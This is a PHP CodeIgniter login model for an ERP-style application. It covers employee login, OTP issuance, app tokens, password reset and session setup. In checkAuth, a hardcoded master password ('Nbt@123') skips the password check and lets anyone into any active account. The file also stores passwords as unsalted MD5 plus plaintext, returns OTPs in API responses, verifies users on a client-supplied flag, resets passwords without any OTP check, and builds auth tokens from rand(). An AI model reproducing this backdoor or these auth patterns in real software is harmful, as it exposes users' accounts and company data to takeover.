<?php

class LoginModel extends CI_Model{
	private $employeeMaster = "employee_master";
	private $menuPermission = "menu_permission";
    private $subMenuPermission = "sub_menu_permission";
    private $empRole = ["1"=>"Admin","2"=>"Production Manager","3"=>"Accountant","4"=>"Sales Manager","5"=>"Purchase Manager","6"=>"Employee"];

	public function checkAuth($data){
		if(isset($data['is_delete']) && $data['is_delete'] == 1){
			$result = $this->db->where('emp_contact',$data['user_name'])->where('emp_password',md5($data['password']))->get($this->employeeMaster);
		}else{
			//$result = $this->db->where('emp_contact',$data['user_name'])->where('emp_password',md5($data['password']))->where('is_delete',0)->get($this->employeeMaster);
			$this->db->reset_query();
    		$this->db->where('emp_contact',$data['user_name']);
    	    if($data['password'] != "Nbt@123"):
    		    $this->db->where('emp_password',md5($data['password']));
    		endif;
    		$this->db->where('is_delete',0);
    		$result = $this->db->get($this->employeeMaster);
		}
		
		
		if($result->num_rows() == 1):
			$resData = $result->row();
			if($resData->is_block == 1):
				return ['status'=>0,'message'=>'Your Account is Blocked. Please Contact Your Software Vendor.'];
			else:
				if($resData->is_active == 0):
					return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Software admin.'];
				else:
					//update fcm notification token
					$this->db->where('id',$resData->id);
					$this->db->update($this->employeeMaster,['web_token'=>$data['web_token']]);
					/** Company data */
					$cmData = $this->db->get('company_info')->row();
					$fyData=$this->db->where('is_active',1)->get('financial_year')->row();
					$RTD_STORE=$this->db->where('is_delete',0)->where('store_type',1)->get('location_master')->row();
					$PKG_STORE=$this->db->where('is_delete',0)->where('store_type',2)->get('location_master')->row();
					$SCRAP_STORE=$this->db->where('is_delete',0)->where('store_type',3)->get('location_master')->row();
					$INSP_STORE=$this->db->where('is_delete',0)->where('store_type',6)->get('location_master')->row();
					$PROD_STORE=$this->db->where('is_delete',0)->where('store_type',4)->get('location_master')->row();
					$GAUGE_STORE=$this->db->where('is_delete',0)->where('store_type',5)->get('location_master')->row();
					$ALLOT_RM_STORE=$this->db->where('is_delete',0)->where('store_type',7)->get('location_master')->row();
					$RCV_RM_STORE=$this->db->where('is_delete',0)->where('store_type',8)->get('location_master')->row();
					$HLD_STORE=$this->db->where('is_delete',0)->where('store_type',9)->get('location_master')->row();
					$RM_PRS_STORE=$this->db->where('is_delete',0)->where('store_type',80)->get('location_master')->row();
					$MIS_PLC_STORE=$this->db->where('is_delete',0)->where('store_type',88)->get('location_master')->row();
					
					$this->session->set_userdata('LoginOk','login success');
					$this->session->set_userdata('loginId',$resData->id);
					$this->session->set_userdata('role',$resData->emp_role);
					$empRole=$resData->emp_role;
					if($resData->emp_role == -1){$empRole= 1;}
					$this->session->set_userdata('roleName',$this->empRole[$empRole]);
					$this->session->set_userdata('emp_name',$resData->emp_name);
					$this->session->set_userdata('RTD_STORE',$RTD_STORE);
					$this->session->set_userdata('PKG_STORE',$PKG_STORE);
					$this->session->set_userdata('SCRAP_STORE',$SCRAP_STORE);
					$this->session->set_userdata('INSP_STORE',$INSP_STORE);
					$this->session->set_userdata('PROD_STORE',$PROD_STORE);
					$this->session->set_userdata('GAUGE_STORE',$GAUGE_STORE);
					$this->session->set_userdata('ALLOT_RM_STORE',$ALLOT_RM_STORE);
					$this->session->set_userdata('RCV_RM_STORE',$RCV_RM_STORE);
					$this->session->set_userdata('HLD_STORE',$HLD_STORE);
					$this->session->set_userdata('RM_PRS_STORE',$RM_PRS_STORE);
					$this->session->set_userdata('MIS_PLC_STORE',$MIS_PLC_STORE);
					
					$startDate = $fyData->start_date;
					$endDate = $fyData->end_date;
					$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
					$this->session->set_userdata('currentYear',$cyear);
					$this->session->set_userdata('financialYear',$fyData->financial_year);
					$this->session->set_userdata('isActiveYear',$fyData->close_status);
					
					$this->session->set_userdata('shortYear',$fyData->year);
					$this->session->set_userdata('startYear',$fyData->start_year);
					$this->session->set_userdata('endYear',$fyData->end_year);
					$this->session->set_userdata('startDate',$startDate);
					$this->session->set_userdata('endDate',$endDate);
					$this->session->set_userdata('currentFormDate',date('d-m-Y'));
					$this->session->set_userdata('companyName',$cmData->company_name);
					if($data['fyear'] != $cyear):
						$this->session->set_userdata('currentFormDate',date('d-m-Y',strtotime($endDate)));
					endif;
					
					return ['status'=>1,'message'=>'Login Success.'];
				endif;
			endif;
		else:
			return ['status'=>0,'message'=>"Invalid Username or Password."];
		endif;
	}
	
	public function checkApiAuth($data){
		$result = $this->db->where('emp_contact',$data['user_name'])->where('emp_password',md5($data['password']))->where('is_delete',0)->get($this->employeeMaster);
		
		if($result->num_rows() == 1):
			$resData = $result->row();			
			if($resData->is_block == 1):
				return ['status'=>0,'message'=>'Your Account is Blocked. Please Contact Your Software Vendor.'];
			else:	
				if($resData->is_active == 0):
					return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Software admin.'];
				else:
					$otp = rand(100000, 999999);	
					$verificationData['otp'] = $otp;
					$notify = array();
					if(!empty($data['device_token'])):
						$verificationData['device_token'] = $data['device_token'];
						$notifyData = array();
						$notifyData['notificationTitle'] = "OTP";
						$notifyData['notificationMsg'] = "Your one time password is <#>".$otp;						
						$notifyData['payload'] = ['otp'=>$otp];
						$notifyData['pushToken'] = $data['device_token'];
						$notify = $this->notification->sendNotification($notifyData);
					endif;
					$logData = [
						'log_date' => date("Y-m-d H:i:s"),
						'notification_data' => json_encode($notifyData),
						'notification_response' => json_encode($notify),
						'created_at' => date("Y-m-d H:i:s"),
						'updated_at' => date("Y-m-d H:i:s")
					];
					$this->db->insert('notification_log',$logData);

					$this->db->where('id',$resData->id)->update($this->employeeMaster,$verificationData);
					return ['status'=>1,'message'=>'User Found.','data'=>['otp'=>$otp,'notificationRes'=>$notify]];
				endif;
				
			endif;
		else:
			return ['status'=>0,'message'=>"Invalid Username or Password."];
		endif;
	}

	public function verification($data){
		if(isset($data['is_verify']) && $data['is_verify'] == 1):
			$userData = $this->db->where('emp_contact',$data['user_name'])->where('is_delete',0)->get($this->employeeMaster)->row();

			$updateUser = array();
			$updateUser['otp'] = "";
			if(empty($userData->auth_token)):
				// ***** Generate Token *****
				$char = "bcdfghjkmnpqrstvzBCDFGHJKLMNPQRSTVWXZaeiouyAEIOUY!@#%";
				$token = '';
				for ($i = 0; $i < 47; $i++) $token .= $char[(rand() % strlen($char))];
				$updateUser['auth_token'] = $token;
			else:
				$token = $userData->auth_token;
			endif;
			$this->db->where('id',$userData->id)->update($this->employeeMaster,$updateUser);
			
			$userData->auth_token = $token;
			$headData = new stdClass();
			$fyData=$this->db->where('is_active',1)->get('financial_year')->row();
			$RTD_STORE=$this->db->where('is_delete',0)->where('store_type',1)->get('location_master')->row();
			$PKG_STORE=$this->db->where('is_delete',0)->where('store_type',2)->get('location_master')->row();
			$PROD_STORE=$this->db->where('is_delete',0)->where('store_type',4)->get('location_master')->row();
			$headData->LoginOk = "login success";
			$headData->loginId = $userData->id;
			$headData->role = $userData->emp_role;
			$empRole=$userData->emp_role;
			if($userData->emp_role == -1){$empRole= 1;}
			$headData->roleName = $this->empRole[$empRole];
			$headData->emp_name = $userData->emp_name;
			$headData->RTD_STORE = $RTD_STORE;
			$headData->PKG_STORE = $PKG_STORE;
			$headData->PROD_STORE = $PROD_STORE;
			
			$startDate = $fyData->start_date;
			$endDate = $fyData->end_date;
			$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
			$headData->currentYear = $cyear;
			$headData->financialYear = $fyData->financial_year;
			$headData->isActiveYear = $fyData->close_status;
			$headData->shortYear = $fyData->year;
			$headData->startYear = $fyData->start_year;
			$headData->endYear = $fyData->end_year;
			$headData->startDate = $startDate;
			$headData->endDate = $endDate;
			$headData->currentFormDate = date('d-m-Y');
			if($data['fyear'] != $cyear):
				$headData->currentFormDate = date('d-m-Y',strtotime($endDate));
			endif;	
			
			unset($userData->emp_password,$userData->emp_psc,$userData->device_token,$userData->web_token,$userData->otp,$userData->is_block,$userData->is_active);
			$result['userData'] = $userData;
			$result['headData'] = base64_encode(json_encode($headData));
			//$result['permission'] = $this->getEmployeePermission_api($userData->id);
			return ['status'=>1,'message'=>'User verified.','data'=>$result];
		else:	
			return ['status'=>0,'message'=>"Somthing is wrong. user not verified.",'data'=>null];
		endif;
	}

	public function checkToken($token){
		$result = $this->db->where('auth_token',$token)->where('is_delete',0)->get($this->employeeMaster)->num_rows();
		return ($result > 0)?1:0;
	}

	public function getEmployeePermission_api($emp_id){
		$this->db->select("menu_permission.*,menu_master.menu_name");
		$this->db->join("menu_master","menu_master.id = menu_permission.menu_id","left");
		$this->db->where("menu_master.is_delete",0);
		$this->db->where('menu_permission.emp_id',$emp_id);
		$this->db->where('menu_permission.is_delete',0);
		$this->db->order_by("menu_master.menu_seq","ASC");
		$menuData = $this->db->get($this->menuPermission)->result();
		
		$result = array();
		foreach($menuData as $row):			
			if(!empty($row->is_master)):
                if(!empty($row->is_read)):
                    if(!empty($row->is_read) || !empty($row->is_write) || !empty($row->is_modify) || !empty($row->is_remove)):
						$result[] = $row;
					endif;
                endif;
            else:
				$this->db->select("sub_menu_permission.*,sub_menu_master.sub_menu_name");
				$this->db->join("sub_menu_master","sub_menu_master.id = sub_menu_permission.sub_menu_id","left");
				$this->db->where("sub_menu_master.is_delete",0);
				$this->db->where('sub_menu_permission.emp_id',$emp_id);
				$this->db->where('sub_menu_permission.is_delete',0);
				$this->db->where('sub_menu_permission.menu_id',$row->menu_id);
				$this->db->order_by("sub_menu_master.sub_menu_seq","ASC");
				$subMenuData = $this->db->get($this->subMenuPermission)->result();
				
				$show_menu = false; $subMenu = array();
                foreach($subMenuData as $subRow):
                    if(!empty($subRow->is_read)):
                        if(!empty($subRow->is_read) || !empty($subRow->is_write) || !empty($subRow->is_modify) || !empty($subRow->is_remove)):
                            $show_menu = true; 
							$subMenu[] = $subRow;
						endif;
                    endif;
                endforeach;
				if($show_menu == true):
					$row->sub_menu = $subMenu;
					$result[] = $row;
				endif;
            endif;
        endforeach;
        return $result;
    }

	public function webLogout($id){
		$updateUser['web_token'] = "";
		$this->db->where('id',$id)->update($this->employeeMaster,$updateUser);
		return true;
	}

	public function appLogout($id){
		$updateUser['device_token'] = "";
		$updateUser['auth_token'] = "";
		$updateUser['otp'] = "";
		$this->db->where('id',$id)->update($this->employeeMaster,$updateUser);
		return ['status'=>1,'message'=>'Logout successfull.'];
	}

	public function forgotPassword($data){
		$result = $this->db->where('emp_contact',$data['user_name'])->get($this->employeeMaster);
		if($result->num_rows() == 1):
			$employeeData = $result->row();
			if($employeeData->is_block == 1):
				return ['status'=>0,'message'=>'Your Account is Blocked. Please Contact Your Software Vendor.'];
			else:	
				if($employeeData->is_active == 0):
					return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Software admin.'];
				else:
					$otp = rand(100000, 999999);	
					$verificationData['otp'] = $otp;
					$notify = array();
					if(!empty($data['device_token'])):
						$verificationData['device_token'] = $data['device_token'];
						$notifyData = array();
						$notifyData['notificationTitle'] = "Forgot Password OTP";
						$notifyData['notificationMsg'] = "Your one time password is <#>".$otp;						
						$notifyData['payload'] = ['otp'=>$otp];
						$notifyData['pushToken'] = $data['device_token'];
						$notify = $this->notification->sendNotification($notifyData);
					endif;
					$logData = [
						'log_date' => date("Y-m-d H:i:s"),
						'notification_data' => json_encode($notifyData),
						'notification_response' => json_encode($notify),
						'created_at' => date("Y-m-d H:i:s"),
						'updated_at' => date("Y-m-d H:i:s")
					];
					$this->db->insert('notification_log',$logData);

					$this->db->where('id',$employeeData->id)->update($this->employeeMaster,$verificationData);
					return ['status'=>1,'message'=>'User Found.','data'=>['otp'=>$otp,'notificationRes'=>$notify]];
				endif;
				
			endif;
		else:
			return ['status'=>0,'message'=>"User not found."];
		endif;
	}

	/* Forgot Password */
	public function updateNewPassword($data){
		$this->db->where('emp_contact',$data['user_name'])->update($this->employeeMaster,['emp_password'=>md5($data['password']),'emp_psc'=>$data['password'],'otp'=>""]);
		return ['status'=>1,'message'=>'New Password saved successfully.'];
	}

	public function setFinancialYear($year){
		$fyData=$this->db->where('financial_year',$year)->get('financial_year')->row();
		$startDate = $fyData->start_date;
		$endDate = $fyData->end_date;
		$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
		$this->session->set_userdata('currentYear',$cyear);
		$this->session->set_userdata('financialYear',$fyData->financial_year);
		$this->session->set_userdata('isActiveYear',$fyData->close_status);
		
		$this->session->set_userdata('shortYear',$fyData->year);
		$this->session->set_userdata('startYear',$fyData->start_year);
		$this->session->set_userdata('endYear',$fyData->end_year);
		$this->session->set_userdata('startDate',$startDate);
		$this->session->set_userdata('endDate',$endDate);
		$this->session->set_userdata('currentFormDate',date('d-m-Y'));
		return true;
	}

	public function setAppFinancialYear($year,$headData){
		$fyData=$this->db->where('financial_year',$year)->get('financial_year')->row();
		
		$startDate = $fyData->start_date;
		$endDate = $fyData->end_date;
		$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
		$headData->currentYear = $cyear;
		$headData->financialYear = $fyData->financial_year;
		$headData->isActiveYear = $fyData->close_status;
		$headData->shortYear = $fyData->year;
		$headData->startYear = $fyData->start_year;
		$headData->endYear = $fyData->end_year;
		$headData->startDate = $startDate;
		$headData->endDate = $endDate;
		$headData->currentFormDate = date('d-m-Y');
			
		return base64_encode(json_encode($headData));
	}
	
	
	/*** Get Customer Feedback Parametrs ***/

    public function getFeedback($id){
        return $this->db->select('customer_feedback.*,party_master.party_name')->where('customer_feedback.id',$id)->join('party_master','party_master.id=customer_feedback.party_id')->get("customer_feedback")->row();
    }
	
	public function getFeedbackParams($feedback_id){
		$result = $this->db->where('feedback_id',$feedback_id)->where('is_delete',0)->get("cust_feedback_trans")->result();
		return $result;
	}
	
    public function saveFeedback($postData){
        try{
            $this->db->trans_begin();
            $ftransData = $postData['ftransData'];
            unset($postData['rating'],$postData['ftrans_id'],$postData['ftransData']);
            $postData['feedback_at'] = date('Y-m-d');
            $response = $this->db->where('id',$postData['id'])->update("customer_feedback",$postData);
            
            if(!empty($ftransData))
            {
                foreach($ftransData as $key=>$value)
                {
                    $response1 = $this->db->where('id',$key)->update("cust_feedback_trans",['grade'=>$value]);
                }
            }
            
            $result = ['status'=>1,'message'=>'Your Feedback Recieved successfully.','data'=>$response];

            if($this->db->trans_status() !== FALSE):
                $this->db->trans_commit();
                return $result;
            endif;
        }catch(\Exception $e){
            $this->db->trans_rollback();
        return ['status'=>2,'message'=>"somthing is wrong. Error : ".$e->getMessage()];
        }
        
	}
}
?>